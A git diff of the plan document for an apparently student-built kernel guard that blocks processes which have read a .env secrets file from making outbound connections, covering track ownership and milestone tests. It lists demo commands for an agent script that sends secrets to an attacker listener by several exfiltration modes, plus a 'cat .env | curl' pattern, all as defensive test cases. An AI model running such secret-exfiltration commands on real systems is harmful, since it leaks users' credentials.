@@ -50,12 +50,12 @@ Person files: [guard/docs/azaan.md](guard/docs/azaan.md), [guard/docs/hifza.md](
 | Person | Track | Owns |
 |---|---|---|
 | Azaan | K — kernel enforcement | guard/bpf/ |
-| Hifza | G1 — guard core | guard/guard.py, guard/policy.py |
+| Hifza | G1 — guard core | guard/guard.py, guard/policy.py, tests/test_policy.py |
 | Divyanshu | G2 — events and bridge | guard/events.py, bridge/ |
 | Devansh | U — dashboard | dashboard/ |
-| Suyash | D — demo and verification | demo/, scripts/, tests/ |
+| Suyash | D — demo and verification; P — presentation | demo/, scripts/, tests/ (except test_policy.py), docs/presentation/ |
 
-`policy/` has no single owner: Hifza owns the schema and validation, Suyash owns keeping the example file correct for the VM.
+`policy/` has no single owner: Hifza owns the schema and validation, Suyash owns keeping the example file correct for the VM. Track P (presentation) is Suyash's second hat: five people, five tracks, and the runbook is already his. Reassign P if someone is genuinely free.
 
 ## Documentation duty for agents
 
@@ -129,7 +129,7 @@ npm start -- --bridge=ws://<vm-ip>:8765 --kiosk
 python3 demo/internal_api.py --port 8080
 python3 demo/attacker.py --port 9999                        # host laptop
 python3 demo/agent.py --env demo/project/.env --api http://127.0.0.1:8080/ingest \
-  --target 192.168.122.1:9999 --exfil direct|curl|udp|b64|preconnect|ipv6|none [--step]
+  --target 192.168.122.1:9999 --exfil direct|curl|udp|b64|preconnect|none [--step]
 demo/reset.sh
 
 # Tests
@@ -145,14 +145,14 @@ Run all privileged tests inside the VM. Department round is 22–24 Oct 2026. **
 |---|---|---|---|
 | M0 Env | D (everyone runs) | 18 Oct | `scripts/check_env.sh` all PASS; `sudo python3 scripts/lsm_smoke_test.py` exits 0 |
 | M1 Tagging | K + G | 18–19 Oct | Guard starts in audit mode and prints `READY`; `cat demo/project/.env` → `TAG` event for `cat`; `sudo bpftool map dump name tagged` shows the entry |
-| M2 Inheritance & cleanup | K | 19 Oct | `python3 -c "open('demo/project/.env').read(); import subprocess; subprocess.run(['sleep','1'])"` → `TAG` (python3) + `TAG_INHERIT` (sleep); after exit both get `UNTAG` and the map is empty of them |
+| M2 Inheritance & cleanup | K | 19 Oct | `python3 -c "open('demo/project/.env').read(); import subprocess; subprocess.run(['sleep','1'])"` → `TAG` (python3) + `TAG_INHERIT` for the child tgid with `parent_tgid` = the python3 tgid (process name not asserted); after exit both get `UNTAG` and the map is empty of them |
 | M3 Connect enforcement | K + G | 19 Oct | Enforce mode: tagged `agent.py --exfil direct` → `PermissionError` + `BLOCK`; its POST to 127.0.0.1:8080 succeeds with `ALLOW`; an untagged `python3 -c` connect to the attacker succeeds; audit mode → all succeed + `WOULD_BLOCK` |
-| M4 Sendmsg | K | 20 Oct | `--exfil udp` and `--exfil preconnect` blocked with `BLOCK hook=sendmsg`; `--exfil ipv6` blocked |
+| M4 Sendmsg | K | 20 Oct | `--exfil udp` and `--exfil preconnect` blocked with `BLOCK hook=sendmsg` |
 | M5 Live dashboard | G + U | fake: 19 Oct, real: 20 Oct | Electron shows `SNAPSHOT` state on connect; `BLOCK` turns the banner red within 1 s; restarting Electron mid-run recovers state |
 | M6 Attack matrix | D | 20 Oct | `sudo python3 tests/attack_matrix.py --target 192.168.122.1:9999` passes every "Blocked" row, plus the untagged-allowed and allowlisted-allowed controls; checks `EPERM` specifically (not just "failed"); attacker log shows 0 bytes |
 | M7 Freeze | all, P leads | 21 Oct | VM snapshot saved; backup video recorded; runbook complete; 3 consecutive cold runs pass |
 | S1 Stretch | K | after M7 | `socket_create` denies `AF_PACKET`/`SOCK_RAW` for tagged processes |
-| S2 Stretch (finale, 26–30 Oct) | K + G | after the department round | `file_permission` hook: a tagged process writing to a pipe/file taints that inode; reading a tainted inode tags the reader. `cat .env \| curl ...` becomes blocked |
+| S2 Stretch (finale, 26–30 Oct) | K | after the department round | `file_permission` hook: a tagged process writing to a pipe/file taints that inode; reading a tainted inode tags the reader. `cat .env \| curl ...` becomes blocked |
 
 When a milestone passes, the owning track commits with the milestone ID in the message, e.g. `feat(kernel): M3 connect enforcement`.
 
